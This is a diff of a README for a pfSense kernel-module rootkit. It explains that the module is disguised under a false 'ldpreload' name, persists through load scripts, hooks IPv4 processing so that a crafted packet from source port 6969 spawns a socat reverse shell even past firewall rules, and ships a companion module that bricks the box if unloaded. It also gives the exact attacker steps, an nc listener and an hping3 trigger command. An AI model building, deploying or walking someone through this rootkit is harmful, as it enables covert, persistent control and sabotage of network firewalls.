@@ -1,13 +1,27 @@
-The "unused" directory holds the c code that compiles binaries.
+cite Sharad!!!
 
-To compile "apeshit" within pfsense you need to use "clang15 -I/sys -o apeshit apeshit_daemon.c" since stdio.h doesn't k know the path of cdefs.h. 
+First off an important note, the current .ko files are only usable for pfSense 2.7.2 CE.
+You to compile these yourself, you must do it within a pfSense box, NOT a compatable freeBSD kernel.
+To be able to compile within pfSense you must follow the steps outlined in "extra/how_to_setup_pfsense_to_compile.txt".
 
-"apeshit_damon.c" produces "apeshit" which is a binary that creates a daemon that sleeps infinitly and is named apeshit, you can see it with "pgrep -l apeshit".
+The "extra" directory holds the C code and Makefile to create an LKM that will brick the box if unloaded and eternally just print's a face, normal input will still work on the terminal it jsut scrolls really fast.
 
-"brickbox.ko" posts an image and funny message everytime a packet comes in or goes out, this can actually be stopped by running <kldunload brickbox.ko> but who da hell is gonna know dat.  It is completely still possible to run commands but the screen prints really fast so it is hard to see shit.  Inside unused is "make_brick_box_face.c" which has comments at the top for the makefile and creates this bin.
+ldpreload/LD_PRELOAD is a false name used for the rootkit since this LKM does not exist within pfSense but appears normal.
 
-We use socat since FreeBSD's native version of nc (netcat) doesn't allow for reverse shells.
-Run "nc -lvnp 7000" on the attaking machine before asking for a reverse shell since you need to be listening for it, the listening port can't be 6969.
-To construct a packet that will trigger the packet filtering and send a reverse shell simply run
+This LKM/Rootkit has persistance, from ldpreload.sh, which is loaded via load_and_setup.sh.
+
+To load the Rootkit you must clone this directroy, cd into it, chmod +x load_and_setup.sh, and run ./load_and_setup.sh.
+
+What does it do?
+This Rootkit registers a custom hook to the top of the IPv4 head within pfSense and establishes reverse shells by forking the process that runs cat and running the reverse shell command in that fork with execve.
+This is super duper mega awesome because even if firewall rules are made against the attacker IP, ports, anything.  The registered hook will still receive the packet and make a reverse shell.
+We use socat to make the reverse shell since FreeBSD's native version of nc (netcat) doesn't allow for reverse shells.
+
+To get a reverse shell!
+
+Run "nc -lvnp 7000" on the attaking machine in a terminal.
+In another terminal, send packets that will pop open a reverse shell with the command
 "sudo hping3 -S -p <destination port> -s 6969 <ip of victim box>"
-from your host machine targeting the ip of the victim box that has the rootkit, currently any destination port works.
+Once you see the reverse shell connect, run control + c in the terminal that is sending the packets (you do not need to keep sending more traffic).
+If the reverse shell doesn't connect after about 5 packets then run control + c in the terminal that is sending packets and re-run the command, packet filtering is finickey and sometimes you need to try a couple times.
+
